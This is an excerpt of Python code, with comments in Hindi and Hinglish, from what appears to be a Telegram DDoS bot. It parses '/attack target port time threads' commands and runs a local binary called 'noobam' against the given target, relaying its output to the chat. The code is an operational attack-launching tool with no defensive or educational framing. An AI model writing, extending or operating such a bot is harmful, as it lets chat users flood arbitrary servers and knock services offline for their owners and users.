...
def process_attack_details(message):
    ...
    if len(details) == 4:  # ✅ 4 arguments hone chahiye: target, port, attack_time, threads
        target = details[0]
        try:
            port = int(details[1])
            attack_time = int(details[2])
            threads = int(details[3])  # ✅ Extract threads from message
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                response = f"✅ Attack launched on {target}:{port} for {attack_time} seconds with {threads} threads by {username}."
            ...
            response = "❗️ Error: Invalid port, attack time, or threads. Please provide numeric values."
    else:
        response = "❗️ Error: Invalid format. Expected: /attack target port time threads"
...
def run_attack(target, port, attack_time, threads, message):
    ...
    try:
        # 1. बाइनरी फ़ाइल की जाँच करें
        BINARY_PATH = os.path.abspath("./noobam")
        if not os.path.exists(BINARY_PATH):
            bot.reply_to(message, "❌ Error: noobam binary not found!")
            return

        # 2. Execute permission सुनिश्चित करें
        if not os.access(BINARY_PATH, os.X_OK):
            os.chmod(BINARY_PATH, 0o755)
            bot.reply_to(message, "⚠️ Fixed permissions for noobam")

        # 3. पूर्ण पथ के साथ कमांड बनाएँ
        full_command = f"{BINARY_PATH} {target} {port} {attack_time} {threads}"
        
        # 4. सबप्रोसेस को सही डायरेक्टरी में चलाएँ
        ...
        # 5. रियल-टाइम आउटपुट पढ़ें
        while True:
            output = process.stderr.readline().decode().strip()
            if output == '' and process.poll() is not None:
                break
            if output:
                bot.reply_to(message, f"🔧 Debug: {output}")

        # 6. अंतिम स्टेटस चेक करें
        exit_code = process.poll()
        if exit_code == 0:
            bot.reply_to(message, "✅ Attack successfully executed!")
        else:
            bot.reply_to(message, f"❌ Attack failed with code {exit_code}")
